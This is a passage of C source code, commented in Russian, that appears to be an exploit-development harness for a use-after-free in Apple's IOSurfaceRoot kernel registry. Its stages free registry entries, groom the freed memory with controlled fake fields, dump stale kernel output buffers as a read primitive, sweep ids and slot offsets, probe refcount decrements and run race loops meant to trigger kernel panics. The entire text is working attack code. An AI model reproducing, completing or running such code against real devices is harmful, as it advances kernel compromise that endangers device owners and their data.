    uint64_t *cases[3] = {fa, fb, fc};
    for (int t = 0; t < 3; t++) {
        int hits = 0; uint32_t lastDup = 0;
        for (int i = 0; i < 5; i++) {
            mach_port_t wp = newWakePort();
            callSel(c, SEL_REG, in, 24, shape, wp);
            callSel(c, SEL_DEREG, in, 24, 0, wp);
            groomRawFields(cases[t], 6, 24);
            kern_return_t rdup = callSel(c, SEL_REG, in, 24, shape, wp);
            if (rdup != 0xE00002C9) hits++;
            lastDup = (uint32_t)rdup;
            freeGroom(); dropPort(wp); usleep(2000);
        }
        LOGF("[uaf][E5] %s hits=%d/5 dup=0x%x", names[t], hits, lastDup);
    }
    IOServiceClose(c);
}

// ---- Этап E6: (1) дамп out-буфера dup при stale-hit (kernel READ примитив);
// (2) id-sweep: groom id = реальный surface id+N — эхо другим handle = парсинг;
// (3) сдвиг fake-id по qword-слотам f0..f2 (entry layout может начинаться иначе).
static void stageE6(int shape) {
    LOGF("[uaf][E6] === stage E6: dup out-дамп + id-sweep + slot-shift ===");
    io_connect_t c = 0;
    if (IOServiceOpen(gSvc, mach_task_self(), 0, &c) != KERN_SUCCESS) { LOGF("[uaf][E6] open fail"); return; }
    uint64_t in[3] = {1,2,3};

    // --- (1) дамп structureOutput dup на stale-entry после groom ---
    {
        mach_port_t wp = newWakePort();
        callSel(c, SEL_REG, in, 24, shape, wp);
        callSel(c, SEL_DEREG, in, 24, 0, wp);
        uint64_t f[6] = {0x21, 0xAABBCCDDEEFF0011ull, 0x1234567890ABCDEFull, 0x5555555555555555ull, 0x4141414141414141ull, 0x43414E415259ull};
        groomRawFields(f, 6, 24);
        uint8_t out[256]; uint32_t olen = sizeof(out);
        memset(out, 0xCC, sizeof(out));
        // dup c structureOutput: дублируем callSel вручную c out-буфером
        uint64_t ref = 0x1122334455667788ull; uint32_t soc = 0;
        kern_return_t r = IOConnectCallAsyncMethod(c, SEL_REG, wp, &ref, 1, NULL,0, in,24, out,&olen, NULL,NULL);
        LOGF("[uaf][E6] dup-out rc=0x%x olen=%u", (uint32_t)r, olen);
        if (r == 0 && olen) {
            for (uint32_t o = 0; o + 8 <= olen && o < 64; o += 8)
                LOGF("[uaf][E6] out[%u]=0x%016llx", o, *(uint64_t *)(out + o));
        }
        // сравнение с baseline: dup на ЖИВОЙ entry (без groom)
        uint8_t out2[256]; uint32_t olen2 = sizeof(out2); memset(out2, 0xCC, sizeof(out2));
        kern_return_t r2 = IOConnectCallAsyncMethod(c, SEL_REG, wp, &ref, 1, NULL,0, in,24, out2,&olen2, NULL,NULL);
        LOGF("[uaf][E6] dup-out baseline rc=0x%x olen=%u", (uint32_t)r2, olen2);
        if (r2 == 0 && olen2) {
            for (uint32_t o = 0; o + 8 <= olen2 && o < 64; o += 8)
                LOGF("[uaf][E6] base-out[%u]=0x%016llx", o, *(uint64_t *)(out2 + o));
        }
        freeGroom(); dropPort(wp);
    }

    // --- (2) id-sweep: groom id = реальный surface id+1..+4 ---
    {
        IOSurfaceRef_ s = mkSurface();
        uint32_t sid = s && pGetID ? pGetID(s) : 0;
        LOGF("[uaf][E6] real surface id=0x%x", sid);
        if (sid) {
            for (int d = 1; d <= 4; d++) {
                mach_port_t wp = newWakePort();
                callSel(c, SEL_REG, in, 24, shape, wp);
                callSel(c, SEL_DEREG, in, 24, 0, wp);
                uint64_t f[6] = {0x21, (uint64_t)(sid + d), 0, 0, 0x4141414141414141ull, 0x43414E415259ull};
                groomRawFields(f, 6, 24);
                kern_return_t rdup = callSel(c, SEL_REG, in, 24, shape, wp);
                LOGF("[uaf][E6] id-sweep id+%-2d dup=0x%x", d, (uint32_t)rdup);
                freeGroom(); dropPort(wp); usleep(2000);
            }
            if (s) CFRelease(s);
        }
    }

    // --- (3) сдвиг fake-id по qword-слотам f0..f2 ---
    for (int slot = 0; slot < 3; slot++) {
        int hits = 0; uint32_t lastDup = 0;
        for (int i = 0; i < 5; i++) {
            mach_port_t wp = newWakePort();
            callSel(c, SEL_REG, in, 24, shape, wp);
            callSel(c, SEL_DEREG, in, 24, 0, wp);
            uint64_t f[6] = {0x4141414141414141ull, 0x4141414141414141ull, 0x4141414141414141ull, 0, 0, 0x43414E415259ull};
            f[slot] = 0x21;
            groomRawFields(f, 6, 24);
            kern_return_t rdup = callSel(c, SEL_REG, in, 24, shape, wp);
            if (rdup != 0xE00002C9) hits++;
            lastDup = (uint32_t)rdup;
            freeGroom(); dropPort(wp); usleep(2000);
        }
        LOGF("[uaf][E6] slot%d=0x21 hits=%d/5 dup=0x%x", slot, hits, lastDup);
    }
    IOServiceClose(c);
}

// ---- Этап E7: sync dup-out дамп + size sweep + refcnt-decrement + zero-ctrl ----

static void stageE7(int shape) {
    LOGF("[uaf][E7] === stage E7: sync dup-out + size-sweep + refcnt-dec + zero-ctrl ===");
    io_connect_t c = 0;
    if (IOServiceOpen(gSvc, mach_task_self(), 0, &c) != KERN_SUCCESS) { LOGF("[uaf][E7] open fail"); return; }
    uint64_t in[3] = {1,2,3};

    // --- (1) SYNC dup с structureOutput: stale-hit дамп vs baseline ---
    {
        uint8_t out[256]; uint32_t olen = sizeof(out); memset(out, 0xCC, sizeof(out));
        mach_port_t wp = newWakePort();
        callSel(c, SEL_REG, in, 24, shape, wp);
        callSel(c, SEL_DEREG, in, 24, 0, wp);
        uint64_t f[6] = {0x21, 0xAABBCCDDEEFF0011ull, 0x1234567890ABCDEFull, 0x5555555555555555ull, 0x4141414141414141ull, 0x43414E415259ull};
        groomRawFields(f, 6, 24);
        kern_return_t r = IOConnectCallMethod(c, SEL_REG, NULL, 0, in, 24, NULL, NULL, out, &olen);
        LOGF("[uaf][E7] sync dup-out rc=0x%x olen=%u", (uint32_t)r, olen);
        if (r == 0 && olen)
            for (uint32_t o = 0; o + 8 <= olen && o < 64; o += 8)
                LOGF("[uaf][E7] out[%u]=0x%016llx", o, *(uint64_t *)(out + o));
        freeGroom();
        uint8_t out2[256]; uint32_t olen2 = sizeof(out2); memset(out2, 0xCC, sizeof(out2));
        callSel(c, SEL_REG, in, 24, shape, wp);   // свежий живой entry
        kern_return_t r2 = IOConnectCallMethod(c, SEL_REG, NULL, 0, in, 24, NULL, NULL, out2, &olen2);
        LOGF("[uaf][E7] base sync dup-out rc=0x%x olen=%u", (uint32_t)r2, olen2);
        if (r2 == 0 && olen2)
            for (uint32_t o = 0; o + 8 <= olen2 && o < 64; o += 8)
                LOGF("[uaf][E7] base-out[%u]=0x%016llx", o, *(uint64_t *)(out2 + o));
        dropPort(wp);
    }

    // --- (2) size sweep 32/48/64: id-маркер в КАЖДОМ qword ---
    {
        IOSurfaceRef_ s = mkSurface();
        uint32_t sid = s && pGetID ? pGetID(s) : 0;
        int sizes[] = {32, 48, 64};
        for (int si = 0; si < 3; si++) {
            int sz = sizes[si]; int nq = sz / 8;
            uint64_t f[16]; for (int q = 0; q < nq; q++) f[q] = sid ? (uint64_t)(sid + 1) : 0x21;
            mach_port_t wp = newWakePort();
            callSel(c, SEL_REG, in, 24, shape, wp);
            callSel(c, SEL_DEREG, in, 24, 0, wp);
            groomRawFields(f, nq, sz);
            kern_return_t rdup = callSel(c, SEL_REG, in, 24, shape, wp);
            LOGF("[uaf][E7] sz=%d all-id dup=0x%x (%s)", sz, (uint32_t)rdup, rcName((uint32_t)rdup));
            freeGroom(); dropPort(wp); usleep(2000);
        }
        if (s) CFRelease(s);
    }

    // --- (3) refcnt-decrement probe: f0={N}, серия dereg — сколько dereg до смены кода ---
    {
        for (int trial = 0; trial < 4; trial++) {
            static const uint64_t f0v[4] = {1, 2, 3, 0x21};
            uint64_t f[6] = {f0v[trial], 0xAABBCCDDEEFF0011ull, 0, 0, 0x4141414141414141ull, 0x43414E415259ull};
            mach_port_t wp = newWakePort();
            callSel(c, SEL_REG, in, 24, shape, wp);
            callSel(c, SEL_DEREG, in, 24, 0, wp);
            groomRawFields(f, 6, 24);
            LOGF("[uaf][E7] refcnt-dec f0=%llu seq:", (unsigned long long)f0v[trial]);
            for (int k = 0; k < 6; k++) {
                kern_return_t rd = callSel(c, SEL_DEREG, in, 24, 0, wp);
                LOGF("[uaf][E7]   dereg#%d -> 0x%x (%s)", k + 1, (uint32_t)rd, rcName((uint32_t)rd));
                if (rd != 0 && rd != 0xE00002C9) break;
            }
            kern_return_t rdup = callSel(c, SEL_REG, in, 24, shape, wp);
            LOGF("[uaf][E7]   final dup=0x%x", (uint32_t)rdup);
            freeGroom(); dropPort(wp); usleep(2000);
        }
    }

    // --- (4) контроль: zero-буфер vs content — одинаков ли dup=0x0? ---
    {
        for (int variant = 0; variant < 2; variant++) {
            int hits = 0; uint32_t lastDup = 0;
            for (int i = 0; i < 5; i++) {
                mach_port_t wp = newWakePort();
                callSel(c, SEL_REG, in, 24, shape, wp);
                callSel(c, SEL_DEREG, in, 24, 0, wp);
                if (variant == 0) {
                    uint64_t z[6] = {0,0,0,0,0,0};
                    groomRawFields(z, 6, 24);
                } else {
                    uint64_t f[6] = {0x21, 0xAABBCCDDEEFF0011ull, 0x1234567890ABCDEFull, 0x5555555555555555ull, 0x4141414141414141ull, 0x43414E415259ull};
                    groomRawFields(f, 6, 24);
                }
                kern_return_t rdup = callSel(c, SEL_REG, in, 24, shape, wp);
                if (rdup == 0) hits++;
                lastDup = (uint32_t)rdup;
                freeGroom(); dropPort(wp); usleep(2000);
            }
            LOGF("[uaf][E7] ctrl variant=%s hits=%d/5 lastDup=0x%x", variant ? "content" : "zero", hits, lastDup);
        }
    }
    IOServiceClose(c);
}

int nj_entry_isurf_uaf(void) {
    LOGF("[uaf] === CVE-2026-112477 IOSurfaceRoot registry UAF (mode 407) ===");
    loadIOSurface();
    if (findService() != 0) return -1;

    int shape = calibrate();
    if (shape < 0) { LOGF("[uaf] calib FAIL — sel17 async недоступен"); return -2; }

    int okB = stageB(shape);
    if (okB < 120) LOGF("[uaf][B] WARNING: не все 120 — возможно 27.2 (0xE00002D8 = sticky +0xf1)");

    // Этап E3: контролы ложного срабатывания перед эскалацией
    stageE3(shape);

    if (okB >= 100) {
        stageE(shape);   // старый оракул (baseline-информация)
        stageE2(shape);  // v2: dup/dereg stale-read oracle + sweep размеров input
        stageE4(shape);  // v3: field mapping f[0] + dereg-effect (decrement probe)
        stageE5(shape);  // v4: content-dependence — kernel читает поля groom-буфера?
        stageE6(shape);  // v5: dup out-дамп + id-sweep + slot-shift
        stageE7(shape);  // v6: sync dup-out + size-sweep + refcnt-dec + zero-ctrl
    } else {
        LOGF("[uaf][E] SKIP: registry-стаб нестабилен (%d/120) — write-этап опасен, только walk", okB);
    }

    // Этап D: фоновый render loop (walk-провокация GPU workloop)
    gRenderRun = 1;
    pthread_t rth; pthread_create(&rth, NULL, renderLoop, NULL);

    // Этап C: seed-охота, порядок по приоритету рунбука
    LOGF("[uaf][C] phase 1: V_RACE8 x40");
    for (int i = 0; i < 40; i++) v_race8(shape, i);
    LOGF("[uaf][C] phase 2: V_BIG x30");
    for (int i = 0; i < 30; i++) v_big(shape, i);
    LOGF("[uaf][C] phase 3: V_SURFCH x40");
    for (int i = 0; i < 40; i++) v_surfch(shape, i);
    LOGF("[uaf][C] phase 4: V_DEREG18 x40");
    for (int i = 0; i < 40; i++) v_dereg18(shape, i);

    gRenderRun = 0; pthread_join(rth, NULL);
    LOGF("[uaf] DONE — survived. Паника = 'begin без end' фингерпринт; проверь panic-log.");
    LOGF("[uaf] Если 0 паник: свежебутнутый девайс <15мин uptime (условие автора).");
    return 0;
}
